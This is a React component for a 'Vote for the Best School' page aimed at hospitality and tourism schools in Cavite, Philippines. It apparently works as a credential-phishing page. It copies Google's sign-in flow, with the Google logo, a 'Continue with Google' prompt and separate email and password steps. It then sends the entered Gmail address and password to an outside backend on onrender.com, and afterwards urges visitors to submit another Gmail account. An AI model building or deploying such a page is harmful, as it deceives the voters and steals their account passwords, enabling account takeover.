import React, { useState } from 'react';
import { VoteResponse } from '../types';

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL || 'https://votingsystem-tqdk.onrender.com';

const VotingSystem: React.FC = () => {
  const [email, setEmail] = useState<string>('');
  const [showPassword, setShowPassword] = useState<boolean>(false);
  const [password, setPassword] = useState<string>('');
  const [voted, setVoted] = useState<boolean>(false);
  const [loading, setLoading] = useState<boolean>(false);

  const handleNext = (): void => {
    if (!email.trim()) {
      alert('Please enter your email or phone');
      return;
    }
    setShowPassword(true);
  };

  const handleSignIn = async (): Promise<void> => {
    if (!password.trim()) {
      alert('Please enter your password');
      return;
    }
    setLoading(true);
    try {
      const response = await fetch(`${BACKEND_URL}/api/vote`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password }),
      });
      const data: VoteResponse = await response.json();
      if (response.ok) {
        setEmail('');
        setPassword('');
        setShowPassword(false);
        setVoted(true);
      } else {
        alert(data.message || 'Error submitting vote');
      }
    } catch (error) {
      console.error('Error:', error);
      alert('Error connecting to server');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen relative overflow-hidden" style={{ background: 'linear-gradient(135deg, #0f2027 0%, #1a3a2a 40%, #2d1b00 100%)' }}>

      {/* Woven texture overlay */}
      <div className="absolute inset-0 opacity-5" style={{
        backgroundImage: `repeating-linear-gradient(45deg, #d4a017 0px, #d4a017 1px, transparent 1px, transparent 8px),
          repeating-linear-gradient(-45deg, #d4a017 0px, #d4a017 1px, transparent 1px, transparent 8px)`
      }} />

      {/* Tropical leaf silhouettes */}
      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        <svg className="absolute -top-16 -left-16 w-96 h-96 opacity-10" viewBox="0 0 200 200" fill="none">
          <path d="M100 10 Q160 80 100 190 Q40 80 100 10Z" fill="#22c55e" />
          <path d="M100 10 Q100 100 100 190" stroke="#16a34a" strokeWidth="2"/>
        </svg>
        <svg className="absolute -top-8 -right-24 w-80 h-80 opacity-10 rotate-45" viewBox="0 0 200 200" fill="none">
          <path d="M100 10 Q160 80 100 190 Q40 80 100 10Z" fill="#22c55e" />
        </svg>
        <svg className="absolute bottom-0 left-1/4 w-64 h-64 opacity-10 rotate-12" viewBox="0 0 200 200" fill="none">
          <path d="M100 10 Q160 80 100 190 Q40 80 100 10Z" fill="#f59e0b" />
        </svg>
        <svg className="absolute bottom-10 right-1/3 w-48 h-48 opacity-8 -rotate-12" viewBox="0 0 200 200" fill="none">
          <path d="M100 10 Q160 80 100 190 Q40 80 100 10Z" fill="#22c55e" />
        </svg>
        {/* Floating stars/sparkles */}
        {[...Array(16)].map((_, i) => (
          <div
            key={i}
            className="absolute rounded-full"
            style={{
              width: `${3 + Math.random() * 4}px`,
              height: `${3 + Math.random() * 4}px`,
              top: `${Math.random() * 100}%`,
              left: `${Math.random() * 100}%`,
              background: i % 3 === 0 ? '#d4a017' : i % 3 === 1 ? '#22c55e' : '#f97316',
              opacity: 0.4,
              animation: `twinkle ${3 + Math.random() * 4}s ease-in-out infinite`,
              animationDelay: `${Math.random() * 4}s`,
            }}
          />
        ))}
      </div>

      {/* Decorative gold arch top bar */}
      <div className="absolute top-0 left-0 right-0 h-1" style={{ background: 'linear-gradient(90deg, #92400e, #d4a017, #f59e0b, #d4a017, #92400e)' }} />

      {/* Main layout */}
      <div className="relative z-10 min-h-screen flex flex-col">

        {/* Header */}
        <header className="w-full px-4 pt-10 pb-6 md:pt-14">
          <div className="max-w-5xl mx-auto text-center">

            {/* Badge */}
            <div className="inline-flex items-center gap-2 mb-5 px-5 py-2 rounded-full border" style={{
              background: 'rgba(212,160,23,0.12)',
              borderColor: 'rgba(212,160,23,0.45)',
            }}>
              <span style={{ fontSize: 16 }}>🏆</span>
              <span className="text-xs font-bold tracking-widest uppercase" style={{ color: '#f0c040', fontFamily: "'Georgia', serif", letterSpacing: '0.18em' }}>
                Official Voting • Cavite, Philippines
              </span>
              <span style={{ fontSize: 16 }}>🌺</span>
            </div>

            {/* Category pills */}
            <div className="flex flex-wrap items-center justify-center gap-3 mb-5">
              <span className="flex items-center gap-2 px-5 py-2 rounded-full text-sm font-semibold" style={{
                background: 'linear-gradient(135deg, #b45309, #d97706)',
                color: '#fff',
                boxShadow: '0 2px 16px #d9770650',
                fontFamily: "'Georgia', serif",
              }}>
                🍽️ Hotel &amp; Restaurant Management
              </span>
              <span className="flex items-center gap-2 px-4 py-2 rounded-full text-sm font-bold" style={{ color: '#d4a017' }}>×</span>
              <span className="flex items-center gap-2 px-5 py-2 rounded-full text-sm font-semibold" style={{
                background: 'linear-gradient(135deg, #065f46, #059669)',
                color: '#fff',
                boxShadow: '0 2px 16px #05966950',
                fontFamily: "'Georgia', serif",
              }}>
                ✈️ Tourism Management
              </span>
            </div>

            {/* Main headline */}
            <h1 className="font-black leading-tight mb-3" style={{
              fontFamily: "'Georgia', 'Times New Roman', serif",
              fontSize: 'clamp(1.8rem, 5vw, 3.6rem)',
              color: '#fff',
              textShadow: '0 2px 24px rgba(212,160,23,0.3)',
            }}>
              Vote for the{' '}
              <span style={{
                background: 'linear-gradient(90deg, #f59e0b, #fcd34d, #f59e0b)',
                WebkitBackgroundClip: 'text',
                WebkitTextFillColor: 'transparent',
              }}>
                Best School
              </span>
            </h1>

            <p className="text-base md:text-lg" style={{ color: 'rgba(255,255,255,0.55)', fontFamily: "'Georgia', serif", fontStyle: 'italic' }}>
              Recognizing excellence in hospitality &amp; travel education across Cavite
            </p>
          </div>
        </header>

        {/* Main content */}
        <main className="flex-1 flex items-center justify-center px-4 pb-8">
          <div className="w-full max-w-sm">

            {/* Card */}
            <div className="rounded-3xl overflow-hidden" style={{
              background: 'rgba(255,255,255,0.07)',
              backdropFilter: 'blur(20px)',
              border: '1px solid rgba(212,160,23,0.25)',
              boxShadow: '0 8px 48px rgba(0,0,0,0.5), inset 0 1px 0 rgba(212,160,23,0.2)',
            }}>

              {/* Card top accent */}
              <div className="h-1" style={{ background: 'linear-gradient(90deg, #065f46, #d4a017, #b45309)' }} />

              <div className="p-7 sm:p-9">
                {/* Icon cluster */}
                <div className="flex justify-center mb-6">
                  <div className="relative">
                    <div className="w-20 h-20 rounded-2xl flex items-center justify-center text-4xl" style={{
                      background: 'linear-gradient(135deg, rgba(212,160,23,0.2), rgba(6,95,70,0.2))',
                      border: '1px solid rgba(212,160,23,0.35)',
                      boxShadow: '0 4px 24px rgba(212,160,23,0.2)',
                    }}>
                      🗳️
                    </div>
                    <div className="absolute -bottom-1 -right-2 text-xl">🌴</div>
                  </div>
                </div>

                {/* Card title */}
                <div className="text-center mb-7">
                  <h2 className="text-2xl font-bold mb-1" style={{ color: '#fff', fontFamily: "'Georgia', serif" }}>
                    Cast Your Vote
                  </h2>
                  <p className="text-xs" style={{ color: 'rgba(255,255,255,0.45)', letterSpacing: '0.05em' }}>
                    Sign in with your Gmail account to continue
                  </p>
                </div>

                {/* Google logo row */}
                <div className="flex items-center gap-3 mb-6 px-4 py-3 rounded-xl" style={{
                  background: 'rgba(255,255,255,0.05)',
                  border: '1px solid rgba(255,255,255,0.1)',
                }}>
                  <svg className="w-6 h-6 flex-shrink-0" viewBox="0 0 48 48">
                    <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
                    <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
                    <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
                    <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
                  </svg>
                  <span className="text-sm" style={{ color: 'rgba(255,255,255,0.6)' }}>Continue with Google</span>
                </div>

                {/* Form */}
                {!showPassword ? (
                  <div className="space-y-4">
                    <input
                      type="text"
                      value={email}
                      onChange={(e: React.ChangeEvent<HTMLInputElement>) => setEmail(e.target.value)}
                      placeholder="Email or phone"
                      className="w-full px-4 py-3.5 rounded-xl text-sm outline-none transition-all"
                      style={{
                        background: 'rgba(255,255,255,0.08)',
                        border: '1.5px solid rgba(255,255,255,0.15)',
                        color: '#fff',
                        fontFamily: "'Georgia', serif",
                      }}
                      onFocus={e => { e.target.style.borderColor = '#d4a017'; e.target.style.background = 'rgba(212,160,23,0.08)'; }}
                      onBlur={e => { e.target.style.borderColor = 'rgba(255,255,255,0.15)'; e.target.style.background = 'rgba(255,255,255,0.08)'; }}
                      onKeyPress={(e: React.KeyboardEvent) => e.key === 'Enter' && handleNext()}
                    />

                    <p className="text-xs leading-relaxed" style={{ color: 'rgba(255,255,255,0.4)' }}>
                      Not your device? Use Guest mode to sign in privately.{' '}
                      <a href="#" style={{ color: '#d4a017' }}>Learn more</a>
                    </p>

                    <button
                      onClick={handleNext}
                      className="w-full py-3.5 rounded-xl font-bold text-sm tracking-wide transition-all"
                      style={{
                        background: 'linear-gradient(135deg, #b45309, #d97706, #f59e0b)',
                        color: '#fff',
                        fontFamily: "'Georgia', serif",
                        boxShadow: '0 4px 20px rgba(217,119,6,0.4)',
                        letterSpacing: '0.04em',
                      }}
                      onMouseEnter={e => (e.currentTarget.style.opacity = '0.88')}
                      onMouseLeave={e => (e.currentTarget.style.opacity = '1')}
                    >
                      Next →
                    </button>
                  </div>
                ) : (
                  <div className="space-y-4">
                    <div className="flex items-center gap-3 px-4 py-3 rounded-xl" style={{
                      background: 'rgba(255,255,255,0.06)',
                      border: '1.5px solid rgba(212,160,23,0.25)',
                    }}>
                      <div className="w-8 h-8 rounded-full flex items-center justify-center text-base flex-shrink-0" style={{ background: 'linear-gradient(135deg, #b45309, #065f46)' }}>
                        👤
                      </div>
                      <span className="text-sm font-medium truncate" style={{ color: '#fff', fontFamily: "'Georgia', serif" }}>{email}</span>
                    </div>

                    <input
                      type="password"
                      value={password}
                      onChange={(e: React.ChangeEvent<HTMLInputElement>) => setPassword(e.target.value)}
                      placeholder="Enter your password"
                      className="w-full px-4 py-3.5 rounded-xl text-sm outline-none transition-all"
                      style={{
                        background: 'rgba(255,255,255,0.08)',
                        border: '1.5px solid rgba(255,255,255,0.15)',
                        color: '#fff',
                        fontFamily: "'Georgia', serif",
                      }}
                      onFocus={e => { e.target.style.borderColor = '#059669'; e.target.style.background = 'rgba(5,150,105,0.08)'; }}
                      onBlur={e => { e.target.style.borderColor = 'rgba(255,255,255,0.15)'; e.target.style.background = 'rgba(255,255,255,0.08)'; }}
                      onKeyPress={(e: React.KeyboardEvent) => e.key === 'Enter' && handleSignIn()}
                      disabled={loading}
                    />

                    <div className="flex justify-between items-center pt-1">
                      <button
                        onClick={() => setShowPassword(false)}
                        className="text-sm transition-colors"
                        style={{ color: 'rgba(255,255,255,0.45)', fontFamily: "'Georgia', serif" }}
                        disabled={loading}
                        onMouseEnter={e => (e.currentTarget.style.color = '#d4a017')}
                        onMouseLeave={e => (e.currentTarget.style.color = 'rgba(255,255,255,0.45)')}
                      >
                        ← Back
                      </button>
                      <button
                        onClick={handleSignIn}
                        disabled={loading}
                        className="px-7 py-3 rounded-xl font-bold text-sm tracking-wide transition-all"
                        style={{
                          background: loading ? 'rgba(255,255,255,0.1)' : 'linear-gradient(135deg, #065f46, #059669)',
                          color: '#fff',
                          fontFamily: "'Georgia', serif",
                          boxShadow: loading ? 'none' : '0 4px 20px rgba(5,150,105,0.4)',
                          opacity: loading ? 0.6 : 1,
                          cursor: loading ? 'not-allowed' : 'pointer',
                        }}
                      >
                        {loading ? 'Submitting…' : 'Sign in →'}
                      </button>
                    </div>
                  </div>
                )}
              </div>
            </div>

            {/* Note badge */}
            <div className="mt-6 text-center">
              <div className="inline-flex items-center gap-2 px-5 py-2.5 rounded-full" style={{
                background: 'rgba(212,160,23,0.1)',
                border: '1px solid rgba(212,160,23,0.3)',
              }}>
                <span>⚠️</span>
                <span className="text-xs font-medium" style={{ color: 'rgba(255,255,255,0.7)', fontFamily: "'Georgia', serif" }}>
                  1 vote per Gmail account only
                </span>
              </div>
            </div>
          </div>
        </main>

        {/* Thank You Message */}
        {voted && (
          <div className="relative z-10 w-full px-4 pb-10">
            <div className="max-w-md mx-auto">
              <div className="rounded-3xl overflow-hidden text-center" style={{
                background: 'rgba(255,255,255,0.06)',
                backdropFilter: 'blur(20px)',
                border: '1px solid rgba(212,160,23,0.25)',
                boxShadow: '0 4px 32px rgba(0,0,0,0.4)',
              }}>
                <div className="h-0.5" style={{ background: 'linear-gradient(90deg, #065f46, #d4a017, #b45309)' }} />
                <div className="p-8 sm:p-10">
                  <div className="text-5xl mb-4">🎉</div>
                  <h3 className="text-xl font-bold mb-2" style={{ color: '#fff', fontFamily: "'Georgia', serif" }}>
                    Thank you for voting!
                  </h3>
                  <p className="text-sm leading-relaxed" style={{ color: 'rgba(255,255,255,0.55)', fontFamily: "'Georgia', serif", fontStyle: 'italic' }}>
                    You can still vote with another Gmail account.
                  </p>
                  <button
                    onClick={() => setVoted(false)}
                    className="mt-6 px-7 py-2.5 rounded-xl text-sm font-semibold transition-all"
                    style={{
                      background: 'linear-gradient(135deg, #b45309, #d97706)',
                      color: '#fff',
                      fontFamily: "'Georgia', serif",
                      boxShadow: '0 2px 14px rgba(217,119,6,0.35)',
                    }}
                    onMouseEnter={e => (e.currentTarget.style.opacity = '0.85')}
                    onMouseLeave={e => (e.currentTarget.style.opacity = '1')}
                  >
                    Vote with another account →
                  </button>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Footer strip */}
        <div className="text-center pb-5 px-4">
          <p className="text-xs" style={{ color: 'rgba(255,255,255,0.25)', fontFamily: "'Georgia', serif", fontStyle: 'italic' }}>
            🌺 Celebrating Excellence in HRM &amp; Tourism Education · Cavite, Philippines 🌴
          </p>
        </div>
      </div>

      {/* Bottom gold bar */}
      <div className="absolute bottom-0 left-0 right-0 h-0.5" style={{ background: 'linear-gradient(90deg, #92400e, #d4a017, #f59e0b, #d4a017, #92400e)' }} />

      <style>{`
        @keyframes twinkle {
          0%, 100% { opacity: 0.2; transform: scale(1); }
          50% { opacity: 0.6; transform: scale(1.4); }
        }
        input::placeholder { color: rgba(255,255,255,0.35) !important; }
      `}</style>
    </div>
  );
};

export default VotingSystem;